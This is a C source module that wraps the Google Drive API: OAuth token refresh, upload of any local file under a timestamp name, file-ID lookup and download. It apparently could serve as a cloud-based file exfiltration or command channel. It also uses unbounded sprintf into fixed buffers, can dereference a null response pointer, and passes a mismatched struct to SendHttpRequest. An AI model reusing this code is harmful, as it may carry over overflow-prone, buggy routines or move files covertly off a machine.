#include "pch.h"

BOOL RefreshAccessToken
(
	PDRIVE_CONFIG pDriveConfig
)
{
	CHAR szOauthPath[] = "https://oauth2.googleapis.com/token";
	CHAR lpBody[0x400];
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pHttpResp = NULL;
	BOOL Result = FALSE;
	LPSTR lpResult = NULL;
	LPSTR lpContentTypeStr = NULL;

	pHttpClient = HttpClientInit(UriInit(szOauthPath), pDriveConfig->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(lpBody, sizeof(lpBody));
	sprintf_s(lpBody, _countof(lpBody), "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
	pHttpResp = SendHttpRequest(&pDriveConfig->HttpConfig, pHttpClient, NULL, POST, lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
	if (pHttpResp == NULL) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pHttpResp->pRespData, "access_token\": \"", "\",\n");
	if (lpResult == NULL) {
		goto CLEANUP;
	}

	pDriveConfig->HttpConfig.lpAccessToken = lpResult;
	Result = TRUE;
CLEANUP:
	FreeHttpResp(pHttpResp);
	FreeHttpClient(pHttpClient);
	if (lpContentTypeStr != NULL) {
		FREE(lpContentTypeStr);
	}

	return Result;
}

PDRIVE_CONFIG GoogleDriveInit
(
	_In_ LPSTR lpUserAgent,
	_In_ LPSTR lpClientId,
	_In_ LPSTR lpSecret,
	_In_ LPSTR lpRefreshToken
)
{
	LPSTR lpProxy = NULL;
	PDRIVE_CONFIG lpResult = NULL;
	PHTTP_REQUEST pHttpReq = NULL;

	lpProxy = GetProxyConfig();
	lpResult = ALLOC(sizeof(DRIVE_CONFIG));
	lpResult->lpClientId = lpClientId;
	lpResult->HttpConfig.lpUserAgent = lpUserAgent;
	lpResult->lpClientSecret = lpSecret;
	lpResult->lpRefreshToken = lpRefreshToken;
	lpResult->HttpConfig.dwNumberOfAttemps = 10;
	if (lpProxy != NULL) {
		if (!lstrcmpA(lpProxy, "auto")) {
			lpResult->HttpConfig.pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
		}
		else {
			lpResult->HttpConfig.pProxyConfig = ProxyInit(UserProvided, lpProxy);
		}

		FREE(lpProxy);
	}

	return lpResult;
}

BOOL GoogleDriveUpload
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPWSTR lpFilePath
)
{
	PBYTE pFileData = NULL;
	DWORD cbFileData = 0;
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	CHAR szNewFileName[0x100];
	SYSTEMTIME SystemTime;
	LPSTR lpExtension = NULL;
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;

	pFileData = ReadFromFile(lpFilePath, &cbFileData);
	if (pFileData == NULL || cbFileData == 0) {
		goto CLEANUP;
	}

	lpBody = ALLOC(cbFileData + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, cbFileData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			LogError(L"VirtualAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto CLEANUP;
		}
	}

	ZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
	GetSystemTime(&SystemTime);
	lpExtension = ConvertWcharToChar(PathFindExtensionW(lpFilePath));
	sprintf(szNewFileName, "%d-%d-%d-%d-%d-%d%s", SystemTime.wDay, SystemTime.wMonth, SystemTime.wYear, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond, lpExtension);
	sprintf(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szNewFileName);
	lpUniqueBoundary = GenRandomStr(16);
	cbBody = sprintf(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szNewFileName);
	memcpy(&lpBody[cbBody], pFileData, cbFileData);
	cbBody += cbFileData;
	cbBody += sprintf(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	sprintf(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, This->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(&This->HttpConfig, pHttpClient, NULL, POST, szContentType, lpBody, cbBody, TRUE, FALSE);
	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
		LogError(L"dwStatusCode != HTTP_STATUS_OK at %lls\n", __FUNCTIONW__);
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	if (pFileData != NULL) {
		FREE(pFileData);
	}

	if (lpExtension != NULL) {
		FREE(lpExtension);
	}

	if (lpUniqueBoundary != NULL) {
		FREE(lpUniqueBoundary);
	}

	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	return Result;
}

BOOL GetFileId
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPSTR lpName,
	_Out_ LPSTR* pId
)
{
	CHAR szUri[0x400] = "https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20name%20=%20%27";
	DWORD cbResp = 0;
	BOOL bResult = FALSE;
	LPSTR lpResult = NULL;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	sprintf(&szUri[lstrlenA(szUri)], "%s%%27&fields=files(id,mimeType,name,parents,createdTime)", lpName);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, This->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(This, pHttpClient, NULL, GET, NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pResp->pRespData, "\"id\": \"", "\",\n");
	if (lpResult != NULL) {
		*pId = lpResult;
	}

	bResult = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	return bResult;
}

PBYTE GoogleDriveDownload
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPSTR lpFileId,
	_Out_ PDWORD pcbOutput
)
{
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PBYTE pResult = NULL;
	DWORD dwFileSize = 0;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	sprintf(&szUri[lstrlenA(szUri)], "%s?alt=media", lpFileId);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri, This->HttpConfig.pProxyConfig);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(This, pHttpClient, NULL, GET, NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	pResult = ALLOC(pResp->cbResp + 1);
	memcpy(pResult, pResp->pRespData, pResp->cbResp);
	if (pcbOutput != NULL) {
		*pcbOutput = pResp->cbResp;
	}
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	return pResult;
}